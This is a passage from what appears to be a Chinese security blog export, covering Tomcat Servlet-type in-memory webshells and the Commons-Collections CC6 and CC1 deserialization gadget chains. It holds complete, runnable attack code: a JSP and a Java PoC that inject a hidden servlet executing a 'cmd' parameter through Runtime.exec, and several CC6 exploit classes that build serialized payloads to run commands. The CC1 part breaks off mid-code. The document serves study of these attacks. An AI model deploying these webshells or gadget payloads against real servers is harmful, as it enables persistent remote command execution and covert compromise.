中，这里对应的是 StandardContext。\n\n\n后续把 web.xml 中的内容装载进了 StandardWrapper 中。也就是 StandardWrapper 的装载\n\n那么这里我们就应该思考了，Wrapper 里面包含了我们的恶意 Servlet 内存马，那 Wrapper 最后是放到哪里去的呢？\n\n其实是 addChild() 方法把 Wrapper（这个 Wrapper 后面我们会看到是 StandardWrapper） 放进 StandardContext 里面去了，之后又做了一系列的处理，当时看了很多文章，都交代的很不清楚，我这边带师傅们过一遍。\n\n\n紧接上文，我们跟进 addChild() 方法，这时候去到的是 StandardContext 类的 addChild() 方法，它判断这个 Servlet 是否是 JSP 的 Servlet\n\n\n运行到最后，是这个语句，这里如果环境有问题的师傅可以私聊一下我，我当时也是搭的环境有问题，导致一直在踩坑。\nsuper.addChild(child);\n\n跟进去，发现是它的父类，ContainerBase，这是一个抽象类，当时我一度以为我分析错了，结果发现并不是错误。\nContainerBase 类的 addChild() 方法判断了是否开启全局安全这个配置。\n\n\n继续往下，跟进到 addChildInternal() 方法里面\n\n\n它首先判断了 log，也就是日志功能是否开启，这些都是无足轻重的，主要是它在 753 行这里调用了这个语句\nchild.start();\n\nstart 方法，就是启动一个线程，在我们 Servlet 里面，也就是开启此 Servlet 的线程，我们跟进去看 Servlet 的线程被启动之后做了什么事。\n\n\n这里我们从 ContainerBase 类进入到了 LifecycleBase 类，\n\n\nLifecycleBase 类的 start() 方法这里先是进行了一些基础的日志判断，后面肯定是会走到 init() 方法里面进去的，要不然刚开始 start 的一个 Servlet 直接就 stop，是不合理的。\ninit() 里面就是一些基础的赋值，我们这里就不看了，主要看后面的重点部分 ———— startInternal()\n\n\n跟进去，这里我们就走到了 StandardContext#startInternal，如图\n\n\n往下走，到 5130 行，调用了 fireLifecycleEvent()，它主要做了一个解析 web.xml 的工作。\n\n\nf8 往下走，就会走到 ContextConfig#configureContext 方法这里\n\n\n这里回来，又把 web.xml 的东西装了一遍，过程有点套娃，但是也可以理解。\n\n总而言之，addChild() 方法把 servlet 放进了 children 里面，children 也就是 StandardWrapper，如图。\n\n\n\n在 addChild() 方法之后，调用 addServletMappingDecoded() 方法添加映射关系。\n将 url 路径和 servlet 类做映射。\n  \n总结一下，Servlet 的生成与动态添加依次进行了以下步骤\n\n通过 context.createWapper() 创建 Wapper 对象；\n设置 Servlet 的 LoadOnStartUp 的值； \n设置 Servlet 的 Name ； \n设置 Servlet 对应的 Class ； \n将 Servlet 添加到 context 的 children 中； \n将 url 路径和 servlet 类做映射。\n\n加载 Servlets\n上文我们的分析点是停在了 addChild()，以及 addChild() 之后的 addServletMappingDecoded() 映射。\n这其实是因为我们当时在 StandardContext#startInternal 中，进了 fireLifecycleEvent() 方法，又做了一遍 StandardWrapper 装载的工作。\n\n  \n\n所以这里我们重新回到 StandardContext#startInternal 中，从 fireLifecycleEvent() 方法往下走。\n继续往下走，无非是一些赋值，都不怎么重要，重要的地方在这里：\n\n\n跟进，进入到 loadOnStartup() 方法\n\n\n我们会看到它对 loadOnStartUp 这个属性进行了判断\n\n\n对于这个参数：\n在 servlet 的配置当中，&lt;load-on-startup&gt;1&lt;/load-on-startup&gt; 的含义是： 标记容器是否在启动的时候就加载这个 servlet。 当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet； 当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。 正数的值越小，启动该 servlet 的优先级越高。\n如果要在 web.xml 里面配置应该如此\n&lt;load-on-startup>1&lt;/load-on-startup>\n\n这里对应的实际上就是 Tomcat Servlet 的懒加载机制。\n\n很明显这里 web.xml 的内容肯定不是我们可控的，所以必须要把恶意的 Servlet 放到最前面去加载。这是我们的一种思路\n\n如果不进行相关的操作，其实影响也不算大。\n\n\n0x04 Servlet 内存马编写上文分析了很长篇幅的 Servlet 工作流程，我们可以总结一下到底做了什么。\n小结一下 Servlet 的工作流程首先获取到 HTTP 请求，这里的处理比较简单，和之前 Filter 流程分析是一样的。\n\n后面读取到 web.xml，并且在 WebConfig 方法里面还创建了一个 StandardWrapper，而我们的 Servlets 都会保存到这个 StandardWrapper 里面；\n后续这个 Wrapper 是放到 Context 里面去的，这时候就应该祭出这句名言了：\n\n\n“一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。”“一个 Wrapper 对应一个 Servlet。负责管理 Servlet”\n\n在创建与加载完 StandardWrapper 之后，我们肯定是需要把加载的 Servlets 从 StandardWrapper 里面读取出来，所以这里就到了我们最后的一个过程：加载 Servlets，对应有一个很重要的属性值 ———— loadOnStartUp\n设想 Servlet 内存马的攻击分析一下应该如何攻击；有这么几个关键点：\n\nStandardWrapper\nStandardContext\n恶意 Servlet\n\n这里我直接以流程图来演示吧，更为清晰一些。\n\n\n\n获取 StandardContext 对象\n编写恶意 Servlet\n通过 StandardContext.createWrapper() 创建StandardWrapper 对象\n设置 StandardWrapper 对象的 loadOnStartup 属性值\n设置 StandardWrapper 对象的 ServletName 属性值\n设置 StandardWrapper 对象的 ServletClass 属性值\n将 StandardWrapper 对象添加进 StandardContext 对象的 children 属性中\n通过 StandardContext.addServletMappingDecoded() 添加对应的路径映射\n\n编写 Servlet 内存马的 PoC（.jsp）获取 StandardContext 对象StandardContext对象获取方式多种多样\n&lt;%   \n\tField reqF = request.getClass().getDeclaredField(\"request\");    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext standardContext = (StandardContext) req.getContext();\n%>\n\n或\n&lt;%   \n\tServletContext servletContext = request.getSession().getServletContext();    Field appContextField = servletContext.getClass().getDeclaredField(\"context\");    appContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);    Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");    standardContextField.setAccessible(true);    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);\n%>\n\n编写恶意Servlet&lt;%!\n \n    public class Shell_Servlet implements Servlet &#123;\n        @Override\n        public void init(ServletConfig config) throws ServletException &#123;\n        &#125;\n        @Override\n        public ServletConfig getServletConfig() &#123;\n            return null;\n        &#125;\n        @Override\n        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;\n            String cmd = req.getParameter(\"cmd\");\n            if (cmd !=null)&#123;\n                try&#123;\n                    Runtime.getRuntime().exec(cmd);\n                &#125;catch (IOException e)&#123;\n                    e.printStackTrace();\n                &#125;catch (NullPointerException n)&#123;\n                    n.printStackTrace();\n                &#125;\n            &#125;\n        &#125;\n        @Override\n        public String getServletInfo() &#123;\n            return null;\n        &#125;\n        @Override\n        public void destroy() &#123;\n        &#125;\n    &#125;\n \n%>\n\n创建Wrapper对象&lt;%\n    Shell_Servlet shell_servlet = new Shell_Servlet();\n    String name = shell_servlet.getClass().getSimpleName();\n \n    Wrapper wrapper = standardContext.createWrapper();\n    wrapper.setLoadOnStartup(1);\n    wrapper.setName(name);\n    wrapper.setServlet(shell_servlet);\n    wrapper.setServletClass(shell_servlet.getClass().getName());\n%>\n\n将 Wrapper 添加进 StandardContext\n&lt;%\n    standardContext.addChild(wrapper);\n    standardContext.addServletMappingDecoded(\"/shell\",name);\n%>\n\n完整POC&lt;%@ page import=\"java.lang.reflect.Field\" %>\n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %>\n&lt;%@ page import=\"java.io.IOException\" %>\n&lt;%@ page import=\"org.apache.catalina.Wrapper\" %>\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n \n&lt;%\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext standardContext = (StandardContext) req.getContext();\n%>\n \n&lt;%!\n \n    public class Shell_Servlet implements Servlet &#123;\n        @Override\n        public void init(ServletConfig config) throws ServletException &#123;\n        &#125;\n        @Override\n        public ServletConfig getServletConfig() &#123;\n            return null;\n        &#125;\n        @Override\n        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;\n            String cmd = req.getParameter(\"cmd\");\n            if (cmd !=null)&#123;\n                try&#123;\n                    Runtime.getRuntime().exec(cmd);\n                &#125;catch (IOException e)&#123;\n                    e.printStackTrace();\n                &#125;catch (NullPointerException n)&#123;\n                    n.printStackTrace();\n                &#125;\n            &#125;\n        &#125;\n        @Override\n        public String getServletInfo() &#123;\n            return null;\n        &#125;\n        @Override\n        public void destroy() &#123;\n        &#125;\n    &#125;\n \n%>\n \n&lt;%\n    Shell_Servlet shell_servlet = new Shell_Servlet();\n    String name = shell_servlet.getClass().getSimpleName();\n \n    Wrapper wrapper = standardContext.createWrapper();\n    wrapper.setLoadOnStartup(1);\n    wrapper.setName(name);\n    wrapper.setServlet(shell_servlet);\n    wrapper.setServletClass(shell_servlet.getClass().getName());\n%>\n \n&lt;%\n    standardContext.addChild(wrapper);\n    standardContext.addServletMappingDecoded(\"/servletshell\",name);\n%>\n\nServlet 型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的 url 才能触发\nServlet 型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。\n先访问 Servlet.jsp，完成内存马的注册\n\n\n再访问 servletshell；并带上 cmd 参数\n\n\n编写 Servlet 内存马的 PoC（.java）思想是类似的，师傅们可以自行复现；这里是需要在 web.xml 里面加上 servlet 的调用的。\npackage tomcatShell.Servlet;  \n  \nimport org.apache.catalina.Wrapper;  \nimport org.apache.catalina.connector.Request;  \nimport org.apache.catalina.core.StandardContext;  \n  \nimport javax.servlet.*;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.BufferedReader;  \nimport java.io.IOException;  \nimport java.io.InputStream;  \nimport java.io.InputStreamReader;  \nimport java.lang.reflect.Field;  \n  \npublic class ServletShell implements Servlet &#123;  \n    @Override  \n public void init(ServletConfig servletConfig) throws ServletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n public ServletConfig getServletConfig() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;  \n        Field reqF = null;  \n try &#123;  \n            reqF = servletRequest.getClass().getDeclaredField(\"request\");  \n &#125; catch (NoSuchFieldException e) &#123;  \n            e.printStackTrace();  \n &#125;  \n        reqF.setAccessible(true);  \n Request req = null;  \n try &#123;  \n            req = (Request) reqF.get(servletRequest);  \n &#125; catch (IllegalAccessException e) &#123;  \n            e.printStackTrace();  \n &#125;  \n        StandardContext standardContext = (StandardContext) req.getContext();  \n  \n ServletShell servletShell = new ServletShell();  \n String name = servletShell.getClass().getSimpleName();  \n  \n Wrapper wrapper = standardContext.createWrapper();  \n wrapper.setLoadOnStartup(1);  \n wrapper.setName(name);  \n wrapper.setServlet(servletShell);  \n wrapper.setServletClass(servletShell.getClass().getName());  \n standardContext.addChild(wrapper);  \n standardContext.addServletMappingDecoded(\"/shell\",name);  \n  \n String cmd = servletRequest.getParameter(\"cmd\");  \n if (cmd !=null)&#123;  \n            try&#123;  \n                Runtime.getRuntime().exec(cmd);  \n &#125;catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;catch (NullPointerException n)&#123;  \n                n.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n  \n    @Override  \n public String getServletInfo() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void destroy() &#123;  \n  \n    &#125;  \n  \n    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) &#123;  \n        HttpServletResponse var2 = null;  \n  \n try &#123;  \n            Field var3 = var1.getClass().getDeclaredField(\"response\");  \n var3.setAccessible(true);  \n var2 = (HttpServletResponse)var3.get(var1);  \n &#125; catch (Exception var8) &#123;  \n            try &#123;  \n                Field var4 = var1.getClass().getDeclaredField(\"request\");  \n var4.setAccessible(true);  \n Object var5 = var4.get(var1);  \n Field var6 = var5.getClass().getDeclaredField(\"response\");  \n var6.setAccessible(true);  \n var2 = (HttpServletResponse)var6.get(var5);  \n &#125; catch (Exception var7) &#123;  \n            &#125;  \n        &#125;  \n  \n        return var2;  \n &#125;  \n&#125;\n\n\n0x05 小结Servlet 型内存马相比于前几种的内存马，更容易被查杀出来，Filter 和 Listener 型内存马更改为简单粗暴，因为它们先于 Servlet 内存马之前插入。\n0x06 参考资料https://goodapple.top/archives/1355\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇03-CC6链","url":"/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/","content":"CC6\n\nJava 反序列化 Commons-Collections 篇 03-CC6 链0x01 前言\n开始我们 CC 链代码审计的第二个链子 CC6\n\n先说一说 CC6 链同我们之前 CC1 链的一些不同之处吧，我们当时审计 CC1 链的时候要求是比较严格的。要求的环境为 jdk8u65 与 Commons-Collections 3.2.1\n而我们的 CC6 链，可以不受 jdk 版本制约。\n\n如果用一句话介绍一下 CC6，那就是 CC6 &#x3D; CC1 + URLDNS\n\nCC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链\n0x02 环境搭建\nJdk 8u71\nComoons-Collections 3.2.1\n\n大致的搭建思路可以参照我之前的文章 Java反序列化CommonsCollections篇01-CC1链环境搭建\n0x03 CC6 链分析\n因为前半段链子，LazyMap 类到 InvokerTransformer 类是一样的，我们直接到 LazyMap 下。\n\n然后我们还是找其他调用 get() 方法的地方，我也不知道这是怎么找出来的，因为 get() 方法如果 find usages 会有很多很多方法，可能这就是 Java 安全卷的原因吧。\n1. 寻找尾部的 exec 方法尾部的链子还是 CC1 链中，我们用到的那个 InvokerTransformer 的方法，前一段链子是和 CC1 链是一样的。\n\n\n2. 找链子\n根据 ysoSerial 官方的链子，是 TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。\n\n\n\n这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP 是不嫌多的，多写一写能让自己更加熟练。\n  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 用 decorate 触发弹计算器，确保此链可用  \npublic class LazyMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class);  \n lazyGetMethod.setAccessible(true);  \n lazyGetMethod.invoke(decorateMap, runtime);  \n &#125;  \n&#125;\n链子的下一步是，TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。我们用 TiedMapEntry 写一个 EXP，确保这条链子是能用的。\n\n因为 TiedMapEntry 是作用域是 public，所以我们不需要反射获取它的方法，可以直接调用并修改。\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 调用 TiedMapEntryEXP 确保链子可用  \npublic class TiedMapEntryEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n tiedMapEntry.getValue();\n\t&#125;\n&#125;\n\n\n成功弹出计算器\n\n\n\n\n这里的逻辑还是很简单的，直接 new 一个 TiedMapEntry 对象，并调用它的 getValue() 方法即可，它的 getValue 方法会去调用 map.get(key) 方法。\n\n\n\n现在我们确保了 TiedMapEntry 这一段链子的可用性，往上去找谁调用了 TiedMapEntry 中的 getValue() 方法。\n\n寻找的方法也略提一嘴，因为 getValue() 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。\n\n寻找到同名函数下的 hashCode() 方法调用了 getValue() 方法。\n\n\n如果我们在实战里面，在链子中找到了 hashCode() 方法，说明我们的构造已经可以“半场开香槟”了，\n3. 与入口类结合的整条链子\n前文我们说到链子已经构造到 hashCode() 这里了，这一条 hashCode() 的链子该如何构造呢？\n\n我们去找谁调用了 hashCode() 方法，这里我就直接把答案贴出来吧，因为在 Java 反序列化当中，找到 hashCode() 之后的链子用的基本都是这一条。\nxxx.readObject()\n\tHashMap.put() --自动调用-->   HashMap.hash()\n\t\t后续利用链.hashCode()\n\n更巧的是，这里的 HashMap 类本身就是一个非常完美的入口类。\n\n如果要写一段从 HashMap.put 开始，到 InvokerTransformer 结尾的弹计算器的 EXP，应当是这样的。\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 用 HashMap 的 hash 方法完成链子  \npublic class HashMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n &#125;  \n&#125;\n\n\n这里在 25 行，也就是 HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;(); 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。\n\nOK 言归正传，在构造最终 EXP 之前我们分析一波 ~\n\nHashMap 类的 put() 方法自动调用了 hashCode 方法，我们尝试构造 EXP，结果中居然出现了一个很神奇的现象？！\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 用 HashMap 的 hash 方法完成链子  \npublic class HashMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n我在打断点调试的时候发现当我序列化的时候，就能够弹出计算器，太奇怪了，这与 URLDNS 链中的情景其实是一模一样的。\n4. 解决在序列化的时候就弹出计算器的问题\n参考 URLDNS 链中的思想，先在执行 put() 方法的时候，先不让其进行命令执行，在反序列化的时候再命令执行。\n\n此处强烈建议师傅们去打断点好好理解一下！\n我在打完断点后分析出来的原因是这样的：\n与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);，可以达到我们需要的效果。\n我们之前传进去的参数是 chainedTransformer，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 chainedTransformer。相关的属性值在 LazyMap 当中为 factory\n\n\n\n修改如下\n\nMap lazyMap = LazyMap.decorate(hashMap, chainedTransformer);\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");\n\n-----------------> 变成\n\nMap lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\"));\nlazyMap.remove(\"key\");\n\n\n在执行 put 方法之后通过反射修改 Transformer 的 factory 值\n\n// 某伪代码块\nClass&lt;LazyMap> lazyMapClass = LazyMap.class;  \nField factoryField = lazyMapClass.getDeclaredField(\"factory\");  \nfactoryField.setAccessible(true);  \nfactoryField.set(lazyMapClass, chainedTransformer);\n\n5. 最终 EXPimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// CC6 链最终 EXPpublic class FinalCC6EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n  \n // 在 put 之后通过反射修改值  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Field factoryField = lazyMapClass.getDeclaredField(\"factory\");  \n factoryField.setAccessible(true);  \n factoryField.set(lazyMapClass, chainedTransformer);  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n0x04 解决前文的小坑\n还记得前文中我说的这个问题吗\n\n\n“这里在 25 行，也就是 HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;(); 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。”\n\n原因分析因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 toString() 方法，所以在创建 TiedMapEntry 的时候，就自动调用了 getValue() 最终将链子走完，然后弹出计算器。\n解决\n\n在 IDEA 的偏好设置当中如图修改即可。\n\n\n0x05 小结\n老样子，我们还是需要画个流程图总结一下链子。\n\n先像 ysoserial 那样，写一个利用表\nxxx.readObject()\n\tHashMap.put()\n\tHashMap.hash()\n\t\tTiedMapEntry.hashCode()\n\t\tTiedMapEntry.getValue()\n\t\t\tLazyMap.get()\n\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\tRuntime.exec()\n\n再是我们的流程图\n\n\n\n再提一嘴，CC6 链被称为最好用的 CC 链，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。\n\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇02-CC1链补充","url":"/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/","content":"CC1链补充\n\nJava 反序列化 Commons-Collections 篇 02-CC1 链补充0x01 前言\n书说上回，我们分析了一下 CC1 链当中的 TransformMap 的反序列化攻击，今天来补充一下正版 CC1 链的攻击分析。\n\n0x02 正版 CC1 链分析1. 寻找链尾的 exec 方法\n漏洞点还是 InvokeTransformer，一些测试用的 exp 就先不写啦\n\n在 InvokeTransformer 下的 transform 方法，进行 find usages 操作。\n\n之前我们所讲的是 TransformedMap 的链子，今天我们去追正版 CC1 链里面 LazyMap 的链子。\n\n\n\n我们看到这里，是 LazyMap 这个类的 get 方法中出现了 .transform 方法。get 方法的作用域为 public。\npublic Object get(Object key) &#123;  \n    // create value for key if key is not currently in the map  \n if (map.containsKey(key) == false) &#123;  \n        Object value = factory.transform(key);  \n map.put(key, value);  \n return value;  \n &#125;  \n    return map.get(key);  \n&#125;\n\n\n2. 寻找链子\n我们去找一找 factory 是什么\n\n\n\n在找 factory 的时候偶然发现了 decorate 方法，这个 decorate 方式与我们之前讲的 TransformMap 中的 decorate 方法是一样的作用。\n\n这里的链子，我非常非常非常建议大家动手去写一写，能让你更好的拥有编写 EXP 的能力。\n\n先看这个类的构造函数，作用域为 private，因为无法直接获取，而 decorate 方法里面能够 new 一个 LazyMap 对象，于是我们构造如下的 EXP，来证明这条链子暂时是可行的。\npackage ysoChainsEXP;  \n  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 用 decorate 触发弹计算器，确保此链可用  \npublic class LazyDecorateCalc &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class);  \n lazyGetMethod.setAccessible(true);  \n lazyGetMethod.invoke(decorateMap, runtime);  \n &#125;  \n&#125;\n\n\n\n\n目前证明这条链是可行的，我们继续往上走，最终目标是找到入口类的 readObject 方法。\n\n往上走，我们去找一找谁调用了 LazyMap.get()\n最终在 AnnotationInvocationHandler.invoke() 方法中找到了有一个地方调用了 get() 方法。\n\n\n同时这个类也非常好，它里面有 readObject() 方法，可以作为我们的入口类。\n\n现在的关键点在于我们要触发 AnnotationInvocationHandler.invoke()\n\n0x03 编写 EXP需要触发 invoke 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。我们去找一找能利用的地方\n\n\n在这里调用了 entrySet() 方法，也就是说，如果我们将 memberValues 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 invoke() 方法，最终完成整条链子的调用。\n直接上我们的 EXP\npackage ysoChainsEXP;  \n  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport 